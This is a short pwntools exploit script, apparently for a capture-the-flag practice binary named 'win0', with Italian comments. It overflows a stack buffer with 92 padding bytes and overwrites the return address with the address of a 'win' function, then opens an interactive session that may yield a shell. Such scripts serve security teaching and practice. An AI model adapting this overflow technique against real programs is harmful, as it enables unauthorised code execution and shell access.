#!/usr/bin/env python3
from pwn import *

context.binary = "./win0"

offset = 92
win = 0x08049186

payload = b"A" * offset + p32(win)

p = process("./win0")

# Legge eventuale banner/output iniziale (evita sfasamenti)
try:
    print(p.recvline(timeout=1).decode(errors="ignore"))
except:
    pass

# Invia payload
p.sendline(payload)

# Se win esegue /bin/sh, serve la shell interattiva:
p.interactive()
